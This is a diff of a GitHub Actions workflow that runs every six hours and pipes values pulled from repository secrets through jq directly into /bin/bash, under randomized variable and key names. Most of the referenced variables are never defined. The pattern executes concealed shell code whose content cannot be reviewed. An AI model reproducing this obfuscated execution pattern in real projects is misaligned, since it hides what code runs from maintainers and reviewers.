@@ -1,9 +1,8 @@
 name: doaizhou
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 3/6 * * *'
+    - cron: '32 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +10,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: doaizhou
         env:
-          e19: ${{ secrets.e19 }}
+          yx2485: ${{ secrets.yx2485 }}
         run: |
-          echo $e19 | jq -r .fks97773 | /bin/bash
-          echo $esxu3 | jq -r .nefz89671 | /bin/bash
-          echo $r2919 | jq -r .anogj2590 | /bin/bash
-          echo $p032 | jq -r .tqebb06734 | /bin/bash
-          echo $kklry6 | jq -r .ens2 | /bin/bash
+          echo $yx2485 | jq -r .p30896 | /bin/bash
+          echo $e119 | jq -r .dbq90 | /bin/bash
+          echo $wr95792 | jq -r .fy9971 | /bin/bash
+          echo $isp148 | jq -r .q132 | /bin/bash
+          echo $hbpq74 | jq -r .v2 | /bin/bash
+          echo $oixr2337 | jq -r .vlxmb016 | /bin/bash
+          echo $vm0 | jq -r .dl9497 | /bin/bash
+          echo $jcfc95 | jq -r .z4 | /bin/bash
+          echo $vke4774 | jq -r .vxwld96 | /bin/bash
+          echo $ghxnl5053 | jq -r .p8798 | /bin/bash
+          echo $majig180 | jq -r .alw40 | /bin/bash
 
